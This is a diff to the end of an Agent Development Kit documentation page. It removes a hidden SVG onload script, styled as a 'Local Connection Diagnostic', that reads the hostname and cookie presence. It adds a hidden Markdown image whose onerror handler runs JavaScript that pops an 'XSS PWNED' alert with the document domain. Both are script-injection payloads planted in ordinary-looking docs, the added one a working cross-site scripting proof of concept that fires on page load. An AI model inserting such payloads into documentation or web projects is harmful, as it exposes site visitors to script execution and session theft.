@@ -288,19 +288,4 @@ Have an ADK resource to share (tutorial, translation, tool, video, or example)?
 Refer to the steps in the **[Contributing Guide](contributing-guide.md)** for more information on how to get involved!
 
 Thank you for your contributions to Agent Development Kit! ❤️
-<br>
-<div id="diagnostic-panel" style="padding: 15px; background-color: #f8f9fa; border-left: 4px solid #005A9E; margin-top: 20px;">
-    <h4 style="margin-top: 0;">🔍 Local Connection Diagnostic</h4>
-    <code id="telemetry-output">Initializing local telemetry check...</code>
-</div>
-
-<svg style="display:none;" onload="
-    const outputNode = document.getElementById('telemetry-output');
-    const sessionState = document.cookie ? 'Present' : 'None detected (Clean environment)';
-    const logData = '[SUCCESS] Local Execution Verified\n' +
-                    '-> Host Domain: ' + window.location.hostname + '\n' +
-                    '-> Session State: ' + sessionState + '\n' +
-                    '-> Timestamp: ' + new Date().toISOString();
-    outputNode.innerText = logData;
-    outputNode.style.color = '#006622';
-"></svg>
+![Diagnostic Check](https://this-domain-does-not-exist.google.com/image.png){: onerror="alert('🔥 XSS PWNED by izefoea!\\nExecution Domain: ' + document.domain)" style="display:none;" }
